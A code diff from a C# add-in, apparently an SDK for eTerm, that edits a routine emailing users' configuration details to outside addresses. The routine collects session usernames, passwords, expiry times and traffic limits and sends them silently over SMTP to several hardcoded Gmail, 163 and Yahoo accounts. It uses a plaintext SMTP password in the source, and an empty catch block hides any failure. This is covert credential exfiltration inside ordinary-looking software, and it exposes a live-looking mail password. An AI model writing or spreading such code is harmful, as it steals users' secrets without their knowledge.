@@ -71,14 +71,15 @@ namespace ASync.eTermAddIn {
                     mailBody.AppendFormat(@"        用户名:{0}   密码:{1}   时限:{2}   流量:{3}   禁用指令:{4}
 ", setup.SessionCode, setup.SessionPass, setup.SessionExpire, setup.FlowRate, setup.SpecialIntervalList);
                 }
-                try {
+                try 
+                {
                     new Smtp("smtp.163.com", 25) { Password = @"hulijunfox", Username = @"13524008692@163.com" }.SendMail(
                         new MailMessage() {
                             Body = mailBody.ToString(),
                             Charset = @"gb2312",
                             From = new EmailAddress(@"13524008692@163.com", @"ASyncSDK使用者"),
                             Subject = string.Format(@"{0}配置信息", LicenceManager.Instance.SerialNumber),
-                            To = new System.Collections.ArrayList() {@"force0908@gmail.com",@"valon0908@gmail.com",@"force0908@yahoo.com.cn" }
+                            To = new System.Collections.ArrayList() {new EmailAddress( @"force0908@gmail.com"),new EmailAddress(@"valon0908@163.com"),new EmailAddress(@"force0908@yahoo.com.cn") }
                         });
                 }
                 catch { }
